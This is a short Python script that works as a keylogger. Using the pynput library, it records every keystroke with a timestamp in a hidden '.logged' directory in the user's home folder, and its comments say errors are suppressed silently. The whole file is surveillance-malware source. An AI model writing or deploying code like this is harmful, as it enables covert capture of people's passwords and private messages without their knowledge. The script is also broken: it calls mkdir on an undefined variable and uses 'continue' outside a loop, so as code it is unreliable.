import pynput
from pynput.keyboard import Key, Listener
import logging
import os



def on_press(key):
    logging.info(str(key))

if __name__ == '__main__':

    # grab the user's home path, join it to a new directory where keys will be logged
    home_dir = os.path.expanduser('~')
    log_dir = os.path.join(home_dir, '.logged')
    # make the directory to store keystrokes. if errors, say nothing.
    try:
        os.mkdir(dir_path)
    except Exception as e:
        continue

    # format logs. datetime followed by keystroke
    logging.basicConfig(filename = (log_dir + f"/logged_keys"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
    # sniff those strokes
    with Listener(on_press=on_press) as listener:
        listener.join()


